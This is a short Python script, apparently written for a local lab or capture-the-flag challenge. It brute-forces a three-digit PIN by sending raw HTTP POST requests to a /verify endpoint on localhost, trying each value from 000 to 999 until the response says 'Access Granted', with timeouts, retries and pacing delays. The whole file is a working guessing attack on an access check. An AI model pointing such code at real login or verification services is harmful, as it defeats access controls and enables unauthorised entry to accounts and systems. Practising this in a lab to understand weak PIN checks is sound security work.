import socket
import time

HOST = '127.0.0.1'
PORT = 8888
DELAY = 0.1 

def try_pin(pin):
    pin_str = f"{pin:03d}"
    data = f"magicNumber={pin_str}"

    request = (
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{data}"
    )

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)  
            sock.connect((HOST, PORT))
            sock.sendall(request.encode())

            response = b""
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

        decoded = response.decode(errors="ignore")

        if "Access Granted" in decoded:
            print(f" SUCCESS! PIN: {pin_str}")
            return True

        print(f"Trying PIN {pin_str}")
        return False

    except socket.timeout:
        print(f"⚠️ Timeout with PIN {pin_str}, retrying...")
        time.sleep(DELAY * 2)  
        return False

    except socket.error as e:
        print(f" Socket error with PIN {pin_str}: {e}")
        time.sleep(DELAY * 2)
        return False

def main():
    for pin in range(1000):
        if try_pin(pin):
            print(f"🎉 Found correct PIN: {pin:03d}")
            break
        time.sleep(DELAY)  
    else:
        print(" Failed to find the correct PIN.")

if __name__ == "__main__":
    main()
